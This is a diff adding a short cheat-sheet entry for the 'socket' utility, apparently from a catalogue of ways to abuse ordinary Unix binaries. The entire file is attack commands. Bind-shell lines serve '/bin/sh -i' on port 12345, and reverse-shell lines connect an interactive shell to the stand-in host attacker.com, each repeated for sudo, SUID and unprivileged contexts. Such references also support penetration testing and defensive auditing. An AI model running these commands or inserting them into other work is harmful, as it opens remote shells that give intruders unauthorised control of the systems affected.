@@ -1,0 +1,26 @@
+socket
+======
+
+Bind shell
+----------
+
+[Sudo]
+    socket -svp '/bin/sh -i' 12345
+
+[SUID]
+    socket -svp '/bin/sh -i' 12345
+
+[Unprivileged]
+    socket -svp '/bin/sh -i' 12345
+
+Reverse shell
+-------------
+
+[Sudo]
+    socket -qvp '/bin/sh -i' attacker.com 12345
+
+[SUID]
+    socket -qvp '/bin/sh -i' attacker.com 12345
+
+[Unprivileged]
+    socket -qvp '/bin/sh -i' attacker.com 12345
